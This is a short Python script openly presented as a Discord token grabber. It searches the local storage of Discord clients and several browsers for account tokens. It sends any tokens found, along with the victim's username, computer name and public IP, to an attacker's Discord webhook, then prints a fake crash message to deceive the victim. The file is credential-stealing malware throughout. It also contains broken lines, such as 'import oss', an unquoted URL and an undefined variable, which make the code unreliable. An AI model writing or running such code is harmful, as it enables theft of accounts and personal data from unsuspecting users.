# Simple Discord Tokens Grabber written in Python 
# Author: Martizio
# CTO: Martiizio
# Don't forget to: pip install Webhook...

import oss
import sys
import shutil
import re
import zipfile
from requests import get
from dhooks import Webhook, File


hook = Webhook('YOUR WEBHOOK')
path = os.getenv('APPDATA')
localpath = os.getenv('LOCALAPPDATA')
user = os.getenv('username')
pc_name = os.environ['COMPUTERNAME']
temp_dir = localpath+"\\temp\\"
tokendir = path+"\\Discord\\Local Storage\\leveldb\\"
ptbtokendir = path+"\\discordptb\\Local Storage\\leveldb\\"
canarytokendir = path+"\\discordcanary\\Local Storage\\leveldb\\"
chromedir = localpath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"

ip = get(https://api.ipify.org).text

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue


        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                alltok = token
                hook.send('```css\nDUDE ! YOU HAVE GRAB TOKEN ! \n\nName: '+str(user) + '\nPC NAME: ' + pc_name + '\nIP: {}'.format(ip) +'\n\nAll tokens found: ' + alltok + '```')
        else:
            message += 'No tokens found.\n'

    hook.send('```css\nDUDE ! YOU HAVE GRAB TOKEN ! \n\nName: '+str(user) + '\nPC NAME: ' + pc_name + '\nIP: {}'.format(ip) +'\n\nAll tokens found: ```')
    print('Message do u want show like:')
    print("Error the tool has crashed !")

main()
